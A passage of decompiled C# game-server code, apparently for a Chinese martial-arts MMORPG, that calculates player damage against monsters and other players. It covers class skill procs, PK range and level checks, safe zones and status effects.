												num9 *= 得到气功加成值(9, 10, 1);
											}
										}
										else if (base.Player_Job == 11)
										{
											if ((double)RNG.Next(1, 100) <= base.梅_升天一气功_玄武雷电)
											{
												num9 *= 1.4;
												显示大字(base.人物全服ID, 803);
											}
											if (base.人物坐标_地图 != 7301 && (double)RNG.Next(1, 100) <= base.梅_升天二气功_玄武诅咒)
											{
												num9 += (double)base.人物最大_HP * 0.2;
												显示大字(base.人物全服ID, 806);
											}
										}
										goto IL_0e3e;
									}
									if (追加状态列表 != null && GetAddState(801201))
									{
										base.FLD_攻击速度 = 150;
										更新攻击速度();
									}
									int num27 = RNG.Next(1, 110);
									int num28 = RNG.Next(1, 120);
									int num29 = RNG.Next(1, 120);
									double num30 = base.刺_心神凝聚;
									if (base.当前激活技能ID != 0 && base.当前激活技能ID != 830401 && base.当前激活技能ID != 840401 && num30 != 0.0)
									{
										num30 += 20.0;
									}
									if ((double)num29 <= num30)
									{
										攻击类型 = 136;
										num9 *= 3.0;
										if (base.刺_致手绝命 != 0.0)
										{
											num9 += num9 * (1.0 + base.刺_致手绝命);
										}
									}
									else if ((double)num27 <= base.刺_以怒还怒)
									{
										显示大字(base.人物全服ID, 372);
										攻击类型 = 134;
										num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.5;
										if (base.刺_一招残杀 != 0.0 && (double)RNG.Next(1, 100) <= base.刺_一招残杀)
										{
											显示大字(base.人物全服ID, 1022);
											num9 *= 1.5;
										}
									}
									else if ((double)num28 <= base.刺_连环飞舞)
									{
										显示大字(base.人物全服ID, 272);
										switch (RNG.Next(0, 5))
										{
										default:
											攻击类型 = 129;
											break;
										case 1:
											攻击类型 = 129;
											break;
										case 2:
											攻击类型 = 130;
											break;
										case 3:
											攻击类型 = 131;
											break;
										case 4:
											攻击类型 = 132;
											break;
										case 5:
											攻击类型 = 133;
											break;
										}
										num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
									}
									if (base.刺_荆轲之怒 != 0.0)
									{
										base.人物_SP += (int)(3.0 + (double)base.Player_Level * 0.5 * 0.01 * base.刺_荆轲之怒);
									}
									else if (num9 <= 0.0)
									{
										int num31 = ++base.人物_SP;
									}
									else
									{
										base.人物_SP += 2;
									}
									if (base.刺_升天三气功_无情打击 != 0.0)
									{
										num9 += num7 * base.刺_升天三气功_无情打击;
									}
									武功类 value7;
									if (base.当前激活技能ID == 0 || !World.TBL_KONGFU.TryGetValue(base.当前激活技能ID, out value7))
									{
										goto IL_0e3e;
									}
									if (value7.FLD_武功类型 == 3)
									{
										int num32 = value7.FLD_MP + (武功新[3, value7.FLD_INDEX].武功_等级 - 1) * 武功新[3, value7.FLD_INDEX].FLD_每级加MP;
										if (base.人物_MP >= num32)
										{
											num33 = value7.FLD_AT + (武功新[3, value7.FLD_INDEX].武功_等级 - 1) * value7.FLD_每级加危害 / World.升天技能等级加成;
											魔法使用(num32);
											goto IL_0a13;
										}
										发送激活技能数据(value7.FLD_PID, 2);
									}
									else
									{
										if (base.人物_MP >= value7.FLD_MP)
										{
											num33 = value7.FLD_AT;
											魔法使用(value7.FLD_MP);
											goto IL_0a13;
										}
										发送激活技能数据(value7.FLD_PID, 2);
									}
								}
							}
						}
					}
					else if (PlayList.TryGetValue(人物ID, out value8) && value8.GM模式 != 8 && !value8.Player死亡 && value8.人物_HP > 0 && value8.Player_Level >= 35 && value8.个人商店 == null)
					{
						if (!base.Player死亡 && base.人物_HP > 0 && base.Player_Level >= 35 && 个人商店 == null && base.人物PK模式 != 0 && !打开仓库中)
						{
							if ((base.Player_Job == 4 || base.Player_Job == 11) && Buffer.ToInt32(装备栏已穿装备[12].物品数量, 0) == 0 && 装备栏已穿装备[3].Get物品ID != 0L)
							{
								发送激活技能数据(武功ID, 6);
								初始化已装备物品();
							}
							else if (base.人物坐标_地图 == value8.人物坐标_地图)
							{
								if (base.人物坐标_地图 != 801)
								{
									goto IL_193f;
								}
								if (World.势力战进程 != 0)
								{
									if (!(base.势力战派别 == value8.势力战派别))
									{
										goto IL_193f;
									}
								}
								else if (!(base.帮派名字 == value8.帮派名字))
								{
									goto IL_193f;
								}
							}
						}
						else if (自动攻击 != null)
						{
							自动攻击.Enabled = false;
							自动攻击.Close();
							自动攻击.Dispose();
							自动攻击 = null;
						}
					}
				}
				goto end_IL_0002;
				IL_0e3e:
				if (base.Player_Job == 1)
				{
					if ((double)RNG.Next(1, 80) <= base.刀_连环飞舞)
					{
						int num34 = RNG.Next(0, 10);
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						switch (num34)
						{
						case 1:
							攻击类型 = 129;
							break;
						case 2:
							攻击类型 = 130;
							break;
						case 3:
							攻击类型 = 131;
							break;
						case 4:
							攻击类型 = 132;
							break;
						case 5:
							攻击类型 = 133;
							break;
						default:
							攻击类型 = 129;
							break;
						case 7:
							攻击类型 = 128;
							break;
						case 8:
							攻击类型 = 134;
							num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.5;
							break;
						}
					}
				}
				else if (base.Player_Job == 2)
				{
					if ((double)RNG.Next(1, 80) <= base.剑_连环飞舞)
					{
						int num35 = RNG.Next(0, 10);
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						switch (num35)
						{
						case 1:
							攻击类型 = 129;
							break;
						case 2:
							攻击类型 = 130;
							break;
						case 3:
							攻击类型 = 131;
							break;
						case 4:
							攻击类型 = 132;
							break;
						case 5:
							攻击类型 = 133;
							break;
						default:
							攻击类型 = 129;
							break;
						case 7:
							攻击类型 = 128;
							break;
						case 8:
							攻击类型 = 134;
							num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.5;
							break;
						}
					}
				}
				else if (base.Player_Job == 3)
				{
					if ((double)RNG.Next(1, 80) <= base.枪_连环飞舞)
					{
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						switch (RNG.Next(0, 10))
						{
						case 1:
							攻击类型 = 129;
							break;
						case 2:
							攻击类型 = 130;
							break;
						case 3:
							攻击类型 = 131;
							break;
						case 4:
							攻击类型 = 132;
							break;
						case 5:
							攻击类型 = 133;
							break;
						default:
							攻击类型 = 129;
							break;
						case 7:
							攻击类型 = 128;
							break;
						case 8:
							攻击类型 = 134;
							num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.5;
							break;
						}
					}
				}
				else if (base.Player_Job == 5)
				{
					switch (RNG.Next(0, 6))
					{
					case 1:
						攻击类型 = 126;
						break;
					case 2:
						攻击类型 = 126;
						break;
					case 3:
						攻击类型 = 127;
						break;
					default:
						攻击类型 = 126;
						break;
					case 6:
						攻击类型 = 127;
						break;
					}
				}
				else if (base.Player_Job == 7)
				{
					switch (RNG.Next(0, 10))
					{
					case 1:
						攻击类型 = 126;
						break;
					case 2:
						攻击类型 = 126;
						break;
					case 3:
						攻击类型 = 127;
						break;
					case 4:
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						攻击类型 = 128;
						break;
					case 5:
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						攻击类型 = 129;
						break;
					case 6:
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						攻击类型 = 130;
						break;
					default:
						攻击类型 = 126;
						break;
					case 8:
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						攻击类型 = 132;
						break;
					case 9:
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						攻击类型 = 133;
						break;
					case 10:
						攻击类型 = 134;
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.5;
						break;
					}
				}
				else if (base.Player_Job == 11)
				{
					switch (RNG.Next(0, 6))
					{
					default:
						攻击类型 = 126;
						break;
					case 1:
						攻击类型 = 126;
						break;
					case 2:
						攻击类型 = 126;
						break;
					case 3:
						攻击类型 = 127;
						break;
					case 4:
						攻击类型 = 128;
						num9 = ((num7 - num2) * 1.5 + (double)base.FLD_人物基本_命中 * 0.25) * 2.0;
						break;
					case 5:
						攻击类型 = 134;
						num9 = ((num7 - num2) * 1.5 + (double)base.FLD_人物基本_命中 * 0.25) * 2.5;
						break;
					}
				}
				else if (base.Player_Job == 13)
				{
					switch (RNG.Next(0, 6))
					{
					case 1:
						攻击类型 = 126;
						break;
					case 2:
						攻击类型 = 126;
						break;
					case 3:
						攻击类型 = 127;
						break;
					default:
						攻击类型 = 126;
						break;
					case 6:
						攻击类型 = 127;
						break;
					}
				}
				else if (base.Player_Job > 7)
				{
					switch (RNG.Next(0, 10))
					{
					default:
						攻击类型 = 126;
						break;
					case 1:
						攻击类型 = 126;
						break;
					case 2:
						攻击类型 = 127;
						break;
					case 3:
						攻击类型 = 128;
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 4:
						攻击类型 = 128;
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 5:
						攻击类型 = 129;
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 6:
						攻击类型 = 130;
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 7:
						攻击类型 = 131;
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 8:
						攻击类型 = 132;
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 9:
						攻击类型 = 133;
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 10:
						攻击类型 = 134;
						num9 = ((num7 - num2) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.5;
						break;
					}
				}
				if (base.FLD_装备_追加_中毒概率百分比 > 0.0 && (double)RNG.Next(1, 100) <= base.FLD_装备_追加_中毒概率百分比 && !value.ContainsKeyInAbnormalState(3))
				{
					异常状态类 value9 = new 异常状态类(value, value.FLD_INDEX, 60000, 3, 0.0);
					value.异常状态.Add(3, value9);
				}
				num = 31;
				double num36 = (double)RNG.Next((int)num9 - 15, (int)num9 + 15) + (double)装备追加对怪攻击 + (double)药品追加对怪攻击;
				if (num36 <= 0.0)
				{
					num36 = RNG.Next(1, 5);
				}
				else
				{
					if (base.Player_Job == 2)
					{
						if ((double)RNG.Next(1, 110) <= base.剑_冲冠一怒 && !怒)
						{
							显示大字(base.人物全服ID, 29);
							base.人物_SP += (int)((double)base.人物_SP * base.剑_冲冠一怒 * 0.005);
						}
						if ((double)RNG.Next(1, 100) <= base.剑_移花接木)
						{
							显示大字(base.人物全服ID, 26);
							加血((int)(num36 * 0.5));
						}
					}
					if (base.Player_Job == 9)
					{
						if ((double)RNG.Next(1, 110) <= base.谭_冲冠一怒 && !怒)
						{
							显示大字(base.人物全服ID, 29);
							base.人物_SP += (int)((double)base.人物_SP * base.谭_冲冠一怒 * 0.005);
						}
						if ((double)RNG.Next(1, 100) <= base.谭_移花接木)
						{
							显示大字(base.人物全服ID, 26);
							加血((int)(num36 * 0.5));
						}
					}
				}
				if (base.FLD_装备_追加_伤害值 >= 0)
				{
					num36 += (double)base.FLD_装备_追加_伤害值;
				}
				if (num36 <= 1.0)
				{
					num36 = RNG.Next(1, 5);
				}
				攻击计算完成(this, 人物ID, 武功ID, (int)num36, 攻击类型, value.Rxjh_HP, 0);
				goto end_IL_0002;
				IL_1a66:
				num = 36;
				int num40;
				double num42;
				int num43;
				double num44;
				int num48;
				double num49;
				int 攻击类型3;
				int num79;
				if ((value8.人物坐标_地图 == 2301 || base.人物坐标_地图 == 2301 || value8.人物坐标_地图 == 801 || base.人物坐标_地图 == 801 || base.人物坐标_地图 == 7301 || value8.人物坐标_地图 == 7301 || ((value8.追加状态列表 == null || !value8.GetAddState(1000000099)) && (追加状态列表 == null || !GetAddState(1000000099)))) && (base.人物坐标_地图 != 7301 || !(base.帮派名字 == value8.帮派名字)))
				{
					num = 37;
					if (!触发新手安全区(this) && !触发新手安全区(value8))
					{
						float num37 = value8.人物坐标_X - base.人物坐标_X;
						float num38 = value8.人物坐标_Y - base.人物坐标_Y;
						double num39 = Math.Sqrt((double)num37 * (double)num37 + (double)num38 * (double)num38);
						switch (base.Player_Job)
						{
						default:
							if (num39 > World.其他职业PK距离)
							{
								return;
							}
							break;
						case 11:
							if (num39 > 70.0 + base.梅_玄武的指点)
							{
								return;
							}
							break;
						case 5:
							if (num39 > World.医生PK距离)
							{
								return;
							}
							break;
						case 4:
							if (num39 > World.弓箭手PK距离 + base.弓_猎鹰之眼)
							{
								return;
							}
							break;
						}
						if (value8.Player无敌)
						{
							if (自动攻击 != null)
							{
								自动攻击.Enabled = false;
								自动攻击.Close();
								自动攻击.Dispose();
								自动攻击 = null;
							}
							系统提示("对方刚刚复活,请慢点攻击。", 50, "系统提示");
						}
						else
						{
							num = 38;
							num40 = 计算四神相克(装备栏已穿装备[3].FLD_FJ_四神之力, value8.装备栏已穿装备[0].FLD_FJ_四神之力);
							double num41 = value8.FLD_人物基本_防御New;
							num42 = base.FLD_人物基本_攻击;
							num43 = 0;
							num = 39;
							if (num40 == 1)
							{
								num41 -= (double)value8.衣服防御力;
							}
							num44 = num41 * (1.0 - base.FLD_装备_追加_降低百分比防御);
							if (!检查毒蛇出洞状态())
							{
								if (base.Player_Job == 1)
								{
									if ((double)RNG.Next(1, 110) <= base.破甲几率)
									{
										显示大字(base.人物全服ID, 16);
										num44 *= 得到气功加成值(1, 5, 1);
									}
								}
								else if (base.Player_Job == 8)
								{
									if ((double)RNG.Next(1, 110) <= base.破甲几率)
									{
										显示大字(base.人物全服ID, 16);
										num44 *= 得到气功加成值(8, 7, 1);
									}
								}
								else if (base.Player_Job == 2)
								{
									double num45 = RNG.Next(1, 100);
									double num46 = RNG.Next(1, 100);
									double num47 = 0.0;
									if (num46 <= base.剑_乘胜追击)
									{
										num45 -= base.剑_乘胜追击;
										num47 += base.剑_乘胜追击 * 0.1;
									}
									if (num45 <= base.剑_无坚不摧)
									{
										num44 *= 得到气功加成值(2, 9, 1) - num47;
										显示大字(base.人物全服ID, 120);
									}
								}
							}
							num48 = base.FLD_人物基本_命中;
							if (base.Player_Job == 6 && !检查毒蛇出洞状态())
							{
								if (刺_连消带打数量 != 0.0)
								{
									num42 += 刺_连消带打数量 / 2.0;
									刺_连消带打数量 = 0.0;
								}
								if (追加状态列表 != null && GetAddState(801201))
								{
									num48 = (int)((double)num48 * (1.0 + base.刺_先发制人));
								}
							}
							if (!value8.检查毒蛇出洞状态())
							{
								if (value8.Player_Job == 3 && (double)RNG.Next(1, 100) <= value8.枪_转攻为守)
								{
									value8.显示大字(value8.人物全服ID, 130);
									num44 += (double)value8.FLD_攻击 * value8.枪_转攻为守 * 0.005;
								}
								if (value8.Player_Job == 10 && (double)RNG.Next(1, 100) <= value8.拳师_转攻为守)
								{
									value8.显示大字(value8.人物全服ID, 130);
									num44 += (double)value8.FLD_攻击 * value8.拳师_转攻为守 * 0.005;
								}
							}
							num49 = num42 - num44 + (double)num48 * 0.25 - (double)value8.FLD_人物基本_回避 * 0.25;
							switch (RNG.Next(0, 1))
							{
							default:
								攻击类型3 = 126;
								break;
							case 1:
								攻击类型3 = 127;
								break;
							case 0:
								攻击类型3 = 126;
								break;
							}
							num = 45;
							if (Buffer.ToInt32(装备栏已穿装备[3].物品ID, 0) == 0)
							{
								Random random2 = new Random();
								int 攻击类型4;
								switch (RNG.Next(0, 1))
								{
								default:
									攻击类型4 = 112;
									break;
								case 1:
									攻击类型4 = 113;
									break;
								case 0:
									攻击类型4 = 112;
									break;
								}
								double num50 = random2.Next((int)num49 - 15, (int)num49 + 15);
								if (num50 <= 1.0)
								{
									num50 = RNG.Next(1, 5);
								}
								if (value8.Player_Job == 11)
								{
									if (value8.梅_障力激活 > 0.0)
									{
										num43 = (int)(num50 * (value8.梅_障力激活 * 0.01));
										if (num43 > value8.人物_AP)
										{
											num43 = value8.人物_AP;
										}
										value8.人物_AP -= num43;
									}
								}
								else
								{
									num43 = 0;
								}
								double num51 = num50 - (double)num43;
								if (num51 <= 1.0)
								{
									num51 = 1.0;
								}
								攻击计算完成(this, 人物ID, 武功ID, (int)num51, 攻击类型4, 0, num43);
							}
							else if (num49 <= 0.0)
							{
								double num52 = (base.FLD_装备_追加_伤害值 <= 0) ? 0.0 : ((double)base.FLD_装备_追加_伤害值);
								if (num52 <= 1.0)
								{
									num52 = RNG.Next(1, 5);
								}
								if (value8.Player_Job == 11)
								{
									if (value8.梅_障力激活 > 0.0)
									{
										num43 = (int)(num52 * (value8.梅_障力激活 * 0.01));
										if (num43 > value8.人物_AP)
										{
											num43 = value8.人物_AP;
										}
										value8.人物_AP -= num43;
									}
								}
								else
								{
									num43 = 0;
								}
								double num53 = num52 - (double)num43;
								if (num53 <= 1.0)
								{
									num53 = 1.0;
								}
								攻击计算完成(this, 人物ID, 武功ID, (int)num53, 攻击类型3, 0, num43);
							}
							else
							{
								if (base.Player_Job == 2)
								{
									double num54 = RNG.Next(1, 110);
									if (检查毒蛇出洞状态())
									{
										num54 *= 1000.0;
									}
									if (num54 < base.剑_怒海狂澜)
									{
										num49 *= 得到气功加成值(2, 7, 1);
									}
									goto IL_2c14;
								}
								if (base.Player_Job == 4)
								{
									int num55 = RNG.Next(1, 130);
									int num56 = RNG.Next(1, 110);
									int num57 = RNG.Next(1, 130);
									int num58 = RNG.Next(1, 130);
									if (检查毒蛇出洞状态())
									{
										num58 *= 1000;
										num55 *= 1000;
										num56 *= 1000;
										num57 *= 1000;
									}
									if ((double)num55 <= base.弓_心神凝聚)
									{
										攻击类型3 = 136;
										double num59 = 得到气功加成值(4, 7, 1);
										num49 = ((num42 - num44) * 1.35 + (double)(num48 / 4)) * num59;
									}
									else if ((double)num56 <= base.弓_流星三矢 + base.弓_升天一气功_绝影射魂)
									{
										显示大字(base.人物全服ID, 47);
										num49 = (num42 - num44 + (double)(num48 / 4)) * 2.0;
										攻击类型3 = 129;
									}
									else
									{
										switch (RNG.Next(0, 4))
										{
										default:
											攻击类型3 = 126;
											break;
										case 1:
											攻击类型3 = 126;
											break;
										case 2:
											攻击类型3 = 126;
											break;
										case 3:
											攻击类型3 = 127;
											break;
										case 4:
											攻击类型3 = 128;
											num49 = (num42 - num44 + (double)(num48 / 4)) * 2.0;
											break;
										}
									}
									if ((double)num57 <= base.弓_致命绝杀)
									{
										double num60 = base.弓_致命绝杀 * 得到气功加成值(4, 11, 1);
										num49 *= 1.0 + num60;
										显示大字(base.人物全服ID, 140);
									}
									num49 += base.弓_锐利之箭 + 1.0;
									if ((double)num58 <= base.弓_无明暗矢)
									{
										num49 *= 1.05 + base.弓_无明暗矢 * 0.005;
										显示大字(人物ID, 49);
									}
									if ((double)RNG.Next(1, 100) <= base.升天五式_千里一击)
									{
										num49 *= 1.0 + base.升天五式_千里一击 * 2.0 / 100.0;
										显示大字(base.人物全服ID, 1017);
									}
									goto IL_2c14;
								}
								if (base.Player_Job != 6)
								{
									if (base.Player_Job == 7)
									{
										if (追加状态列表 != null)
										{
											if (!GetAddState(900401))
											{
												int num61 = RNG.Next(0, 99);
												double num62 = RNG.Next(1, 110);
												if (检查毒蛇出洞状态())
												{
													num62 *= 1000.0;
												}
												if (num62 <= base.琴师_梅花三弄 * 100.0)
												{
													显示大字(base.人物全服ID, 87);
													int num63 = (num61 <= 33) ? 900401 : ((num61 < 33 || num61 > 66) ? 900403 : 900402);
													if (!GetAddState(900402) && !GetAddState(900403))
													{
														追加状态类 value10 = new 追加状态类(this, 60000, num63, 0);
														追加状态列表.Add(num63, value10);
														状态效果(Buffer.GetBytes(num63), 1, 60000);
														更新人物数据(this);
													}
												}
												num = 52;
											}
											else
											{
												int num64 = RNG.Next(0, 10);
												double num65 = RNG.Next(1, 100);
												int num66 = RNG.Next(1, 100);
												int num67 = RNG.Next(1, 100);
												int num68 = RNG.Next(1, 100);
												if (检查毒蛇出洞状态())
												{
													num65 *= 1000.0;
													num66 *= 1000;
													num67 *= 1000;
													num68 *= 1000;
												}
												base.琴师_三和弦_发动概率 = base.琴师_岳阳三醉 * 0.005 * 100.0;
												num = 53;
												if (num65 <= base.琴师_鸾凤和鸣 + base.琴师_升天一气功_飞花点翠 * 0.2)
												{
													显示大字(base.人物全服ID, 88);
													base.琴师_三和弦_发动概率 *= 2.0;
												}
												num = 54;
												if ((double)num66 <= base.琴师_三和弦_发动概率)
												{
													if ((double)num67 <= base.琴师_阳明春晓 * 0.5 && !value8.GetAbnormalState(1))
													{
														int 时间3 = (int)(base.琴师_阳明春晓 * 2000.0);
														int num69 = (int)(5.0 + base.琴师_阳明春晓 * 0.5);
														异常状态类 value11 = new 异常状态类(value8, 时间3, 1, num69);
														value8.异常状态.Add(1, value11);
														value8.delFLD_追加百分比_攻击((double)num69 * 0.01);
														value8.更新武功和状态();
													}
													num = 55;
													if ((double)num68 <= base.琴师_潇湘雨夜 * 0.5 && !value8.GetAbnormalState(2))
													{
														int 时间4 = (int)(base.琴师_潇湘雨夜 * 2000.0);
														int num70 = (int)(5.0 + base.琴师_潇湘雨夜 * 0.5);
														异常状态类 value12 = new 异常状态类(value8, 时间4, 2, num70);
														value8.异常状态.Add(2, value12);
														value8.delFLD_追加百分比_防御((double)num70 * 0.01);
														value8.更新武功和状态();
													}
													num = 56;
													if (!value8.GetAbnormalState(1) && !value8.GetAbnormalState(2))
													{
														if (num66 <= 50)
														{
															int 时间5 = (int)(base.琴师_阳明春晓 * 2000.0);
															int num71 = (int)(5.0 + base.琴师_阳明春晓 * 0.5);
															异常状态类 value13 = new 异常状态类(value8, 时间5, 1, num71);
															value8.异常状态.Add(1, value13);
															value8.delFLD_追加百分比_攻击((double)num71 * 0.01);
															value8.更新武功和状态();
														}
														else
														{
															int 时间6 = (int)(base.琴师_潇湘雨夜 * 2000.0);
															int num72 = (int)(5.0 + base.琴师_潇湘雨夜 * 0.5);
															异常状态类 value14 = new 异常状态类(value8, 时间6, 2, num72);
															value8.异常状态.Add(2, value14);
															value8.delFLD_追加百分比_防御((double)num72 * 0.01);
															value8.更新武功和状态();
														}
													}
													num = 57;
													if (num64 == 10 && !value8.GetAbnormalState(10))
													{
														异常状态类 异常状态类2 = new 异常状态类(value8, 10000, 10, (int)num49);
														异常状态类2.异常状态类出血(num49);
														value8.异常状态.Add(10, 异常状态类2);
													}
													num = 58;
												}
											}
										}
									}
									else if (base.Player_Job == 9)
									{
										double num73 = RNG.Next(1, 110);
										if (检查毒蛇出洞状态())
										{
											num73 *= 1000.0;
										}
										if (num73 < base.谭_怒海狂澜)
										{
											num49 *= 得到气功加成值(9, 10, 1);
										}
									}
									else if (base.Player_Job == 11)
									{
										if ((value8.Player_Job == 2 || value8.Player_Job == 9) && base.梅_嫉妒的化身 > 0.0 && (double)RNG.Next(1, 100) <= base.梅_嫉妒的化身)
										{
											num49 *= 1.0 + 得到气功加成值(base.Player_Job, 9, 1);
											显示大字(base.人物全服ID, 808);
										}
										if ((double)RNG.Next(1, 100) <= base.梅_升天一气功_玄武雷电)
										{
											num49 *= 1.4;
											显示大字(base.人物全服ID, 803);
										}
										if (base.人物坐标_地图 != 7301 && (double)RNG.Next(1, 100) <= base.梅_升天二气功_玄武诅咒)
										{
											num49 += (double)base.人物最大_HP * 0.2;
											显示大字(base.人物全服ID, 806);
										}
									}
									goto IL_2c14;
								}
								if (GetAddState(801201))
								{
									base.FLD_攻击速度 = 150;
									更新攻击速度();
								}
								int num74 = RNG.Next(1, 130);
								int num75 = RNG.Next(1, 130);
								if (检查毒蛇出洞状态())
								{
									num74 *= 1000;
									num75 *= 1000;
								}
								double num76 = base.刺_心神凝聚;
								if (base.当前激活技能ID != 0 && base.当前激活技能ID != 830401 && base.当前激活技能ID != 840401 && num76 != 0.0)
								{
									num76 += 20.0;
								}
								if ((double)num75 <= num76)
								{
									显示大字(人物ID, 81);
									攻击类型3 = 136;
									num49 *= 3.0;
									if (base.刺_致手绝命 != 0.0)
									{
										num49 += num49 * (1.0 + base.刺_致手绝命);
									}
								}
								else if ((double)num74 <= base.刺_以怒还怒)
								{
									显示大字(base.人物全服ID, 372);
									攻击类型3 = 134;
									num49 = ((num42 - num44) * 1.25 + (double)(num48 / 4)) * 2.0;
									if ((double)RNG.Next(1, 100) <= base.刺_一招残杀)
									{
										显示大字(base.人物全服ID, 1022);
										num49 *= 1.5;
									}
								}
								else
								{
									int num77 = RNG.Next(1, 120);
									if (检查毒蛇出洞状态())
									{
										num77 *= 1000;
									}
									if ((double)num77 <= base.刺_连环飞舞)
									{
										显示大字(base.人物全服ID, 272);
										switch (RNG.Next(0, 5))
										{
										default:
											攻击类型3 = 129;
											break;
										case 1:
											攻击类型3 = 129;
											break;
										case 2:
											攻击类型3 = 130;
											break;
										case 3:
											攻击类型3 = 131;
											break;
										case 4:
											攻击类型3 = 132;
											break;
										case 5:
											攻击类型3 = 133;
											break;
										}
										num49 = ((num42 - num44) * 1.25 + (double)(num48 / 4)) * 2.0;
										num = 49;
									}
								}
								if (base.刺_升天三气功_无情打击 != 0.0)
								{
									num49 += num42 * base.刺_升天三气功_无情打击;
								}
								武功类 value15;
								if (base.当前激活技能ID == 0 || !World.TBL_KONGFU.TryGetValue(base.当前激活技能ID, out value15))
								{
									goto IL_26b1;
								}
								if (value15.FLD_武功类型 == 3)
								{
									int num78 = value15.FLD_MP + (武功新[3, value15.FLD_INDEX].武功_等级 - 1) * 武功新[3, value15.FLD_INDEX].FLD_每级加MP;
									if (base.人物_MP >= num78)
									{
										num79 = value15.FLD_AT + (武功新[3, value15.FLD_INDEX].武功_等级 - 1) * value15.FLD_每级加危害 / World.升天技能等级加成;
										魔法使用(num78);
										goto IL_2671;
									}
									发送激活技能数据(value15.FLD_PID, 2);
								}
								else
								{
									if (base.人物_MP >= value15.FLD_MP)
									{
										num79 = value15.FLD_AT;
										魔法使用(value15.FLD_MP);
										goto IL_2671;
									}
									发送激活技能数据(value15.FLD_PID, 2);
								}
							}
						}
					}
				}
				goto end_IL_0002;
				IL_26b1:
				num = 50;
				goto IL_2c14;
				IL_0a13:
				num9 = ((base.当前激活技能ID == 830401 || base.当前激活技能ID == 840401) ? (num9 + (double)num33 * 0.5) : (num9 + (double)num33 * 0.25));
				goto IL_0e3e;
				IL_2671:
				num49 = ((base.当前激活技能ID == 830401 || base.当前激活技能ID == 840401) ? (num49 + (double)num79 * 0.5) : (num49 + (double)num79 * 0.2));
				goto IL_26b1;
				IL_193f:
				num = 32;
				if (base.人物PK模式 != 1)
				{
					goto IL_1984;
				}
				if (World.势力战进程 != 0)
				{
					if (!(base.势力战派别 == value8.势力战派别))
					{
						goto IL_1984;
					}
				}
				else if (!(base.帮派名字 == value8.帮派名字))
				{
					goto IL_1984;
				}
				goto end_IL_0002;
				IL_1984:
				num = 34;
				if (base.人物坐标_地图 != 801 && base.人物坐标_地图 != 7301 && Math.Abs(base.Player_Level - value8.Player_Level) > World.PK等级差)
				{
					系统提示("等级差" + World.PK等级差 + "级以上，不能攻击。");
				}
				else
				{
					num = 35;
					if (value8.人物坐标_地图 == 2301 || base.人物坐标_地图 == 2301 || base.人物坐标_地图 == 7301 || value8.人物坐标_地图 == 7301 || value8.人物坐标_地图 == 801 || base.人物坐标_地图 == 801)
					{
						goto IL_1a66;
					}
					if (value8.安全模式 == 1)
					{
						系统提示("对方处于安全模式中,禁止攻击。");
					}
					else
					{
						if (安全模式 != 1)
						{
							goto IL_1a66;
						}
						系统提示("处于安全模式中,禁止攻击。");
					}
				}
				goto end_IL_0002;
				IL_2c14:
				if (base.Player_Job == 1)
				{
					int num80 = RNG.Next(1, 100);
					if (检查毒蛇出洞状态())
					{
						num80 *= 1000;
					}
					if ((double)num80 <= base.刀_连环飞舞)
					{
						显示大字(base.人物全服ID, 272);
						switch (RNG.Next(0, 7))
						{
						case 1:
							攻击类型3 = 129;
							break;
						case 2:
							攻击类型3 = 130;
							break;
						case 3:
							攻击类型3 = 131;
							break;
						case 4:
							攻击类型3 = 132;
							break;
						case 5:
							攻击类型3 = 133;
							break;
						default:
							攻击类型3 = 129;
							break;
						case 7:
							攻击类型3 = 128;
							break;
						}
						num49 = (num42 - num44 + (double)(num48 / 4)) * 2.0;
					}
				}
				else if (base.Player_Job == 2)
				{
					int num81 = RNG.Next(1, 100);
					if (检查毒蛇出洞状态())
					{
						num81 *= 1000;
					}
					if ((double)num81 <= base.剑_连环飞舞)
					{
						显示大字(base.人物全服ID, 272);
						switch (RNG.Next(0, 7))
						{
						case 1:
							攻击类型3 = 129;
							break;
						case 2:
							攻击类型3 = 130;
							break;
						case 3:
							攻击类型3 = 131;
							break;
						case 4:
							攻击类型3 = 132;
							break;
						case 5:
							攻击类型3 = 133;
							break;
						default:
							攻击类型3 = 129;
							break;
						case 7:
							攻击类型3 = 128;
							break;
						}
						num49 = (num42 - num44 + (double)(num48 / 4)) * 2.0;
					}
				}
				else if (base.Player_Job == 3)
				{
					int num82 = RNG.Next(1, 100);
					if (检查毒蛇出洞状态())
					{
						num82 *= 1000;
					}
					if ((double)num82 <= base.枪_连环飞舞)
					{
						显示大字(base.人物全服ID, 272);
						switch (RNG.Next(0, 7))
						{
						case 1:
							攻击类型3 = 129;
							break;
